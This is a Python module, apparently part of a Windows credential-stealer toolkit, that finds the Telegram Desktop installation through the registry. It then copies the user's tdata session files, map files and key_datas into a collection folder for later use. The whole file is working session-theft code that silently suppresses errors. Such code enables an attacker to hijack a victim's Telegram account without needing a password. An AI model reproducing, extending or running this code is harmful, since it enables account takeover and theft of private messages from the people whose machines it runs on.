from re import findall
from os import listdir, path
from typing import Optional
from winreg import OpenKey, QueryValueEx, QueryInfoKey, EnumKey, HKEY_CURRENT_USER

from helper.helpers import MemoryStorage
from helper.helpers.config import TelegramConfig
from helper.helpers.dataclasses import Data


class Telegram:
    """
    Collects sessions from the Telegram.
    """
    def __init__(self, folder: str):

        self.__folder = folder
        self.__config = TelegramConfig()
        self.__storage = MemoryStorage()

    def __get_telegram_path(self) -> Optional[str]:
        """
        Gets the Telegram installation path from the registry.

        Parameters:
        - None.

        Returns:
        - str|None: Telegram installation path if found.
        """
        if path.exists(self.__config.SessionsPath):
            return self.__config.SessionsPath

        try:
            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")

            for i in range(QueryInfoKey(key)[0]):

                subkey_name = EnumKey(key, i)
                subkey = OpenKey(key, subkey_name)

                try:
                    display_name = QueryValueEx(subkey, "DisplayName")[0]

                    if "Telegram" not in display_name:
                        continue

                    return QueryValueEx(subkey, "InstallLocation")[0]
                except FileNotFoundError:
                    pass
        except Exception as e:
            pass

        return None

    def __get_sessions(self) -> None:
        """
        Collects sessions from the Telegram.

        Parameters:
        - None.

        Returns:
        - None.
        """
        telegram_path = self.__get_telegram_path()

        if not telegram_path:
            pass
            return

        telegram_data = path.join(telegram_path, "tdata")
        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)], [])

        if not sessions:
            return

        sessions.remove("D877F783D5D3EF8C")

        for session in sessions:
            self.__storage.add_from_disk(
                path.join(telegram_data, session),
                path.join(self.__folder, session)
            )

        maps = sum([findall(r"map.*", file) for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))], [])

        for map in maps:
            self.__storage.add_from_disk(
                path.join(telegram_data, "D877F783D5D3EF8C", map),
                path.join(self.__folder, "D877F783D5D3EF8C", map)
            )

        self.__storage.add_from_disk(
            path.join(telegram_data, "key_datas"),
            path.join(self.__folder, "key_datas")
        )

        self.__storage.add_data("Application", "Telegram")

    def run(self) -> Data:
        """
        Launches the Telegram collection module.

        Parameters:
        - None.

        Returns:
        - None.
        """
        try:

            self.__get_sessions()

            return self.__storage.get_data()

        except Exception as e:
            pass
